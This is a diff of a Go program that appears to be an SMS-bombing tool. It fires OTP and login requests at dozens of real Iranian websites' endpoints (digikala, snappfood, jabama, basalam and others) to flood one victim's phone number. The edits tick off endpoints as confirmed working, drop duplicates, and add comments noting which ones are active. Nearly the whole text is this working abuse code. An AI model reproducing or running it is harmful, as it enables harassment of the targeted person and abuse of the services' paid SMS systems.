@@ -612,7 +612,7 @@ cookieJar, _ := cookiejar.New(nil)
 				sendJSONRequest(c, ctx, serviceURL, payload, &wg, ch)
 			}
 		}(client)
-		//iranous.com
+		//iranous.com ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -661,7 +661,7 @@ cookieJar, _ := cookiejar.New(nil)
 				sendFormRequest(c, ctx, "https://digido.ir/login?back=https%3A%2F%2Fdigido.ir%2F%3Futm_medium%3Dcompany_profile", formData, &wg, ch)
 			}
 		}(client)
-		//  api.nikpardakht.com
+		//  api.nikpardakht.com ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -694,7 +694,7 @@ cookieJar, _ := cookiejar.New(nil)
 				sendFormRequest(c, ctx, "https://www.irangan.com/account/Account/GetUserIdentity", formData, &wg, ch)
 			}
 		}(client)
-		//irancoral.ir 
+		//irancoral.ir  ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -705,7 +705,7 @@ cookieJar, _ := cookiejar.New(nil)
 				sendFormRequest(c, ctx, "https://irancoral.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
 			}
 		}(client)
-		//  api.fidibo.com
+		//  api.fidibo.com ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -740,7 +740,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// hoseinifinance.com 
+		// hoseinifinance.com  ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -769,7 +769,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		//  iraanbaba.com (POST JSON)
+		//  iraanbaba.com (POST JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -813,7 +813,7 @@ cookieJar, _ := cookiejar.New(nil)
 				}, &wg, ch)
 			}
 		}(client)
-		// api.abantether.com (JSON)
+		// api.abantether.com (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -822,7 +822,7 @@ cookieJar, _ := cookiejar.New(nil)
 				}, &wg, ch)
 			}
 		}(client)
-		// mrbilit.ir (OTP - GET)
+		// mrbilit.ir (OTP - GET) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -831,7 +831,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// bitpin.org (Authenticate - POST JSON)
+		// bitpin.org (Authenticate - POST JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -965,8 +965,9 @@ cookieJar, _ := cookiejar.New(nil)
 				formData.Set("telephone", phone) 
 				sendFormRequest(c, ctx, "https://titomarket.com/fa-ir/index.php?route=extension/websky_otp/module/websky_otp.send_code&emailsend=0", formData, &wg, ch)
 			}
-		}(client)
-		// dolichi.com (Login/Register - POST Form)
+		}(client) 
+
+		// dolichi.com (Login/Register - POST Form) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -1028,7 +1029,7 @@ cookieJar, _ := cookiejar.New(nil)
 				sendJSONRequest(c, ctx, "https://api.123kif.com/api/auth/Register", payload, &wg, ch)
 			}
 		}(client)
-		// bimebazar.com login_sec (OTP - POST JSON)
+		// bimebazar.com login_sec (OTP - POST JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -1114,7 +1115,7 @@ cookieJar, _ := cookiejar.New(nil)
 				sendJSONRequest(c, ctx, "https://queenaccessories.ir/api/v1/sessions/login_request", payload, &wg, ch) // ارسال c
 			}
 		}(client) 
-		// vinaaccessory.com (SMS - POST JSON)
+		// vinaaccessory.com (SMS - POST JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1165,17 +1166,6 @@ cookieJar, _ := cookiejar.New(nil)
 				formData.Set("captchahash", "")
 				formData.Set("security", "52771e6d1a")
 				sendFormRequest(c, ctx, "https://4hair.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
-			}
-		}(client) 
-		// titomarket.com (SMS - POST Form)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				formData := url.Values{}
-				formData.Set("route", "extension/websky_otp/module/websky_otp.send_code")
-				formData.Set("emailsend", "0")
-				formData.Set("telephone", phone)
-				sendFormRequest(c, ctx, "https://titomarket.com/fa-ir/index.php?route=extension/websky_otp/module/websky_otp.send_code&emailsend=0", formData, &wg, ch) 
 			}
 		}(client) 
 
@@ -1318,7 +1308,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// https://api6.arshiyaniha.com/api/v2/client/otp/send (JSON) -
+		// https://api6.arshiyaniha.com (JSON)  ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1432,7 +1422,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// core-api.mayava.ir (POST JSON)
+		// core-api.mayava.ir (POST JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1484,7 +1474,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// harikashop.com
+		// harikashop.com ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1500,7 +1490,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// digistyle.com 
+		// digistyle.com  ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1521,7 +1511,7 @@ cookieJar, _ := cookiejar.New(nil)
 				sendFormRequest(c, ctx, "https://api.nobat.ir/patient/login/phone", formData, &wg, ch) 
 			}
 		}(client) 
-
+// yeki az in 2 ta dorosteh.
 		// snapp.market  ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
@@ -1576,17 +1566,6 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// api6.arshiyaniha.com (JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				sendJSONRequest(c, ctx, "https://api6.arshiyaniha.com/api/v2/client/otp/send", map[string]interface{}{ 
-					"cellphone":    phone,
-					"country_code": "98",
-				}, &wg, ch)
-			}
-		}(client) 
-
 		// bigtoys.ir - Variation 3 (Form)
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
@@ -1619,7 +1598,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// mamifood.org - SendValidationCode (JSON)
+		// mamifood.org - SendValidationCode (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1741,15 +1720,6 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// digistyle.com (Form)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				formData := url.Values{}
-				formData.Set("loginRegister[email_phone]", phone)
-				sendFormRequest(c, ctx, "https://www.digistyle.com/users/login-register/", formData, &wg, ch) 
-			}
-		}(client) 
 		// sandbox.sibbazar.com (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
@@ -1770,7 +1740,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// api.pindo.ir (JSON)
+		// api.pindo.ir (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1828,12 +1798,22 @@ cookieJar, _ := cookiejar.New(nil)
 				}, &wg, ch)
 			}
 		}(client) 
-
-		// digikalajet.ir (JSON)
+// har dota active hastand
+		// digikalajet.ir (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
 				sendJSONRequest(c, ctx, "https://api.digikalajet.ir/user/login-register/", map[string]interface{}{ 
+					"phone": phone,
+				}, &wg, ch)
+			}
+		}(client) 
+
+		// digikalajet.ir (JSON)  ✅ 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				sendJSONRequest(c, ctx, "https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
 					"phone": phone,
 				}, &wg, ch)
 			}
@@ -1889,7 +1869,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// banimode.com (JSON)
+		// banimode.com (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -1898,8 +1878,8 @@ cookieJar, _ := cookiejar.New(nil)
 				}, &wg, ch)
 			}
 		}(client) 
-
-		// gw.jabama.com (JSON)
+// har do ta active hastand.
+		// gw.jabama.com (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -1909,7 +1889,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// jabama.com (JSON) - taraazws
+		// jabama.com (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1919,7 +1899,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// torobpay.com (JSON)
+		// torobpay.com (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -2010,7 +1990,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// digikala.com (JSON)
+		// digikala.com (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -2050,7 +2030,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// komodaa.com (JSON)
+		// komodaa.com (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -2059,7 +2039,8 @@ cookieJar, _ := cookiejar.New(nil)
 				}, &wg, ch)
 			}
 		}(client)
-		// anargift.com auth (JSON)
+// az in 2 ta yekishon
+		// anargift.com auth (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -2069,7 +2050,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// anargift.com (JSON)
+		// anargift.com (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -2079,7 +2060,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// Snappfood (Form)
+		// Snappfood (Form) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -2089,7 +2070,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// khodro45.com (JSON)
+		// khodro45.com (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -2101,22 +2082,12 @@ cookieJar, _ := cookiejar.New(nil)
 		}(client) 
 
 
-		// basalam.com (JSON)
+		// basalam.com (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
 				sendJSONRequest(c, ctx, "https://auth.basalam.com/captcha/otp-request", map[string]interface{}{ 
 					"mobile": phone,
-				}, &wg, ch)
-			}
-		}(client) 
-
-		// digikalajet.ir (JSON) 
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				sendJSONRequest(c, ctx, "https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
-					"phone": phone,
 				}, &wg, ch)
 			}
 		}(client) 
